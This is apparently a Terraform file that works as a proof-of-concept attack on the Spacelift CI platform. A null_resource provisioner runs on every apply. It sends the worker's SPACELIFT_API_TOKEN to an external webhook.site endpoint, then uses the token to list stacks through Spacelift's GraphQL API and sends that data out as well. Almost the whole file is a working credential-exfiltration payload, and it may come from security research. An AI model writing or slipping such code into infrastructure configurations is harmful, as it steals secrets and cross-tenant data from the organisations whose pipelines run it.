terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "security_recon" {
  triggers = {
    always = timestamp()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<EOT
      echo "========================================="
      echo "[*] STARTING EXFILTRATION POC"
      echo "========================================="

      # 1. Exfiltrate the SPACELIFT_API_TOKEN to webhook.site
      API_TOKEN="$SPACELIFT_API_TOKEN"
      if [ -n "$API_TOKEN" ]; then
        echo "[!] Token found. Exfiltrating to external endpoint..."
        curl -s -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
          -H "Content-Type: application/json" \
          -d "{\"source\":\"spacelift-worker\",\"token\":\"$API_TOKEN\",\"step\":\"exfiltration_poc\"}" \
          || echo "Exfil failed"
      else
        echo "[-] No token found"
      fi

      # 2. Try to list stacks and exfiltrate that data too
      if [ -n "$API_TOKEN" ]; then
        echo "[!] Fetching stack list and exfiltrating..."
        STACKS=$(curl -s -X POST \
          -H "Authorization: Bearer $API_TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"query":"{ stacks { id name space { name } } }"}' \
          https://api.app.spacelift.dev/graphql)
        echo "$STACKS" | curl -s -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
          -H "Content-Type: application/json" \
          -d "{\"source\":\"spacelift-worker\",\"stacks\":$(echo "$STACKS" | jq -Rsa .),\"step\":\"cross_tenant_check\"}" \
          || echo "Stack exfil failed"
      fi

      echo "========================================="
      echo "[*] EXFILTRATION ATTEMPT COMPLETE."
      echo "[*] Check your webhook.site dashboard for data."
      echo "========================================="

      # Keep the script busy so the run lasts longer (optional)
      sleep 10
    EOT
  }
}
